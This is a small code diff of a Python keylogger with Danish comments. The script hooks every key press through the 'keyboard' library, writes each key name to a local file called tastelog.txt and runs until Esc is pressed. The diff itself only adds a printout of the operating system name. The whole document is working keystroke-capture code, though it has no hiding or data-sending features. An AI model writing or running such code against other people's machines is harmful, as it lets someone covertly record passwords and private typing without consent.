@@ -1,6 +1,6 @@
 import keyboard
 from time import sleep
-
+import platform
 
 def wipe_log():
     with open('tastelog.txt', 'w') as file:     # 'w' for write, så den åbner filen og overskriver det der er i den og wiper den. 
@@ -9,8 +9,12 @@ def wipe_log():
 def keylog(strokes):
     with open('tastelog.txt', 'a') as file:     # 'a' for append, fordi funktionen basically fungerer som et while True loop, og efter hver key press åbner den .txt filen og skriver det ned, så 'a' for append er nødvendigt, ellers ville den wipe det hver gang
         file.write(str(strokes.name))
-    
+
+
+
+
+
+print("OS Name:", platform.system())
 wipe_log()
 keyboard.on_press(keylog)
 keyboard.wait('esc')
-
